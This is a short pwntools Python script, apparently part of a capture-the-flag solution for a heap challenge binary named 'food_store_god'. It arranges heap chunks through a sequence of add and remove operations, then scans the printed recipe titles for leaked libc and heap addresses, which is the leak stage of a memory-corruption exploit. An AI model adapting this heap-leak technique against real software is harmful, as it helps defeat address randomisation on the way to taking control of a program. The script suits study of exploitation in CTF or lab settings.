import sys,os; sys.path.insert(0,'/mnt/c/Users/ha/Downloads/pwn')
os.environ['LOG']='error'
from pwn import *
DIR='/mnt/c/Users/ha/Downloads/pwn'
p=process([DIR+'/ld-2.24.so','--library-path',DIR,DIR+'/food_store_god'],env={'LD_LIBRARY_PATH':DIR})
def ru(x,**k): return p.recvuntil(x,**k)
def sl(x): p.sendline(x if isinstance(x,bytes) else str(x).encode())
ru(b'Your name: '); sl(b'AAAA')
def add(title,ings=(b'0',)):
    ru(b'Your choice: '); sl(b'1'); ru(b'Your choice: '); sl(b'1'); ru(b'Magic : '); m=p.recvline().strip()
    ru(b'Title :'); sl(title)
    for i,ing in enumerate(ings):
        ru(b'Choose ingredient :'); sl(ing); ru(b'Add more ingredient ? (1/Yes,2/No) : '); sl(b'1' if i<len(ings)-1 else b'2')
    ru(b'Your choice: '); sl(b'4'); return m
def make(nm):
    ru(b'Your choice: '); sl(b'4'); ru(b'Your choice: '); sl(b'3'); ru(b'Ingredient :'); sl(nm); ru(b'Your choice: '); sl(b'4')
def rm(t): ru(b'Your choice: '); sl(b'1'); ru(b'Your choice: '); sl(b'2'); ru(b'Title :'); sl(t); ru(b'Your choice: '); sl(b'4')
n=int(os.environ.get('N','3'))
add(b'AA'); add(b'BB'); make(b'b1'); add(b'YY'); make(b'b2')
rm(b'BB'); rm(b'AA'); add(b'CC')
for i in range(n): make(b'm%d'%i)
rm(b'YY')
ru(b'Your choice: '); sl(b'1'); ru(b'Your choice: '); sl(b'3')
import time; time.sleep(0.4); data=p.recvrepeat(1.0)
import re
titles=re.findall(rb'Title : ([^\n]*)', data)
for t in titles:
    hi = 'LIBC?' if (len(t)>=5 and (0x7c<=t[-1]<=0x7f or (len(t)>=6 and 0x7c<=t[5]<=0x7f))) else ('HEAP?' if (len(t)>=5 and t[-1]==0x55) else '')
    print("title:", t, t.hex(), hi)
print("alive?", p.poll() is None)
p.close()
